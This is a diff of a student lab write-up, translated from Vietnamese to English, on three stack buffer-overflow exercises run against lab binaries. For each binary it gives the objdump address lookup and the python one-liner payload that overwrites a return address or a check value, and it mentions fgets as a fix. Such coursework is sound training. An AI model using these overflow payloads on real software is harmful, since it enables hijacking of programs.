@@ -2,69 +2,73 @@
 
 ## File bof1.c
 
-**Chạy docker**
+**Run vitual environment by docker**
 >docker run -it --privileged -v D:\StudyHK1_2024\InformationSecurity\SecLabs:/home/seed/seclabs img4lab
 
-**Lấy địa chỉ hàm secretFunc()**
+**Getting secretFunc() address by command**
+`objdump -d bof1.out|grep secretFunc`
+
 ![alt text](./image/image.png)
+
 **Stack frame**
 ![alt text](./image/image-1.png)
 
 
-=> Sẽ bị buffer-overflow qua byte thứ 205
+=> It’s a buffer overflow at the 205th byte.
 
-**Chạy chương trình**
-
+**Run the program by the command**
+- Take advantage of the above statement to automatically input 204 bytes of the letter 'a', then insert the address of the `secretFunc` function.
+- replacement byte (204byte) + address secretFunc(\x6b\x84\x04\x08)
  > echo $(python -c "print('a'*204 + '\x6b\x84\x04\x08')") | ./bof1.out
 
-Tận dụng câu lệnh trên để tự động nhập 204 byte là chữ a sau đó chèn địa chỉ của hàm secretFunc vào
 ![alt text](./image/image-2.png)
 
-=> Xâm nhập thành công
+=> Successful Attack
 
->Để tránh xâm nhập trong trường hợp này mình Replace gets() bằng fget() để lấy đúng giới hạn của mảng a.
+=> To prevent exploitation in this case, I will replace `gets()` with `fgets()` to ensure the correct limit of array a is respected.
 
 
 ## File bof2.c
 
-**Phân tích đề**
+**Summarizing**
 
->Trường hợp này mảng buf[] có 40 phần tử nhưng lệnh fget() đọc đến 44 phần tử(fget(buf,45,stdin) phần tử cuối để dành cho \0 là kí tự kết thúc chuỗi)
+- In this case, the array buf[] has 40 elements, but the `fgets()` command reads up to 44 elements `(fgets(buf, 45, stdin))`, with the last element reserved for `\0`, the null terminator character.
 
- => chúng ta dựa vào 4 phần tử cuối để thay đổi check
+ => We rely on the last 4 elements to modify the check.
 
 **Stackframe**
 
 ![alt text](./image/image-3.png)
 
-**Run**
+**Run the program with the command**
 
 ![alt text](./image/image-5.png)
 
 >echo $(python -c "print('a'*40 + '\xef\xbe\xad\xde')") | ./bof2.out
 ![alt text](./image/image-6.png)
 
-=> Xâm nhập thành công
+=> Successfully
 
 
 ## File bof3.c
 
-**Phân tích**
+**Summarizing**
 
->Trường hợp này mảng buf[] có 128 phần tử nhưng lệnh fget() đọc đến 133 phần tử.
+- In this case, the `buf[]` array has 128 elements, but the `fgets()` command reads up to 133 elements.
 
- => chúng ta dựa vào 4 phần tử để thay đôi địa chỉ hàm sup thành địa chỉ hàm shell
+ => We rely on 4 elements to replace the address addition function into the address function shell
 
 **Stack frame**
 
 ![alt text](./image/image-7.png)
-**Lấy địa chỉ hàm shell**
-
+**Get the shell function's address**
+`objdump -d bof3.out|grep shell`
 ![alt text](./image/image-8.png)
 
-**Run**
+**Run the program with the command**
 
->echo $(python -c "print('a'*128 + '\x5b\x84\x04\x08')") | ./bof3.out
-![alt text](./image/image-9.png)
+`echo $(python -c "print('a'*128 + '\x5b\x84\x04\x08')") | ./bof3.out`
+
+![alt text](./image/image-7.png)
 
 => Seccessful
